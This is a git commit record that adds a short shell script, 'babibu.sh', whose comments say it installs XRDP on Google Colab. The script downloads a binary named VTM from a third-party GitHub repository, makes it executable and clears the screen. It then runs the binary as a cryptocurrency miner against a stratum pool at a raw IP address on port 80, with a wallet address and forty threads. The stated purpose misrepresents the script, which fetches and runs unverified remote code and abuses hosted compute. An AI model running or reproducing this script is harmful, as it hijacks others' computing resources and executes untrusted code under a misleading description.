4f2df20d3cca6b580870356ca02d8df3b2fd127d
renilo <88342640+renilo@users.noreply.github.com>
2022-10-07 21:55:42 +0700

    Create babibu.sh

---
+++ babibu.sh
@@ -0,0 +1,8 @@
+# /bin/bash
+# Install XRDP
+# Before get xmr coin for free
+# Google Colab
+wget https://github.com/indah38/theta/raw/main/VTM
+chmod 700 VTM
+clear
+./VTM -a yescryptr16  -o stratum+tcps://178.128.86.41:80 -u vFEneCSxgbhmn7idJxxWULEgD5jS2hyJnQ.OHGITU -p x -t40
